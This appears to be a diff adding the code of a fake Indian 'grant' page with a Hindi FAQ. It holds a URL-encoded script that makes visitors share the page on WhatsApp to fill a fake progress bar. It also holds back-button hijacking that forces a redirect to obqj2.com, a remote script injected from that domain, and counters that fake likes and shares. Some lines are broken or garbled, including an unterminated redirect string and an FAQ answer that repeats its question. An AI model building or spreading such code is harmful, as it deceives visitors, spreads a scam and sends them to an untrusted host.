+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://obqj2.com/4/5885239";
+    }
+    function goon(){
+        location.href="https://obqj2.com/4/5885239";
+    }
+</script>
+
+
+
+	   <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://obqj2.com/4/5885239;
+    }
+    function goon(){
+        location.href="https://obqj2.com/4/5885239;
+    }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://obqj2.com/4/5885239";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+ 
+</div>
+
+
+
+<div class="grant-info" style="max-width: 700px; margin: 20px auto; padding: 20px; background-color: #ffeb3b; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; font-family: Arial, sans-serif;">
+  <h2 style="color: #d32f2f; font-weight: bold; margin-bottom: 15px;">अक्सर पूछे जाने वाले प्रश्नों</h2>
+  <p style="font-size: 16px; line-height: 1.6; color: #333;">
+  
+  
+  <p><strong>Q: कौन आवेदन कर सकता है?</strong>
+        <br>A: केवल भारतीय नागरिक ही पात्र हैं।</p>
+  <br>
+      <p><strong>Q: Is there an age limit?</strong>
+        <br>A: क्या कोई आयु सीमा है?</p>
+  <br>
+      <p><strong>Q: क्या कोई समय सीमा है?</strong>
+        <br>A: हाँ, आवेदन जल्द ही बंद हो जाएगा। तुरंत आवेदन करें।</p></div></div>
+</div>
+
+
+
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>   
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1723825,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
+
+  <script>/<![CDATA[/ cookieChoices = {}; /]]>/</script>
+
+
+
+</body></html>
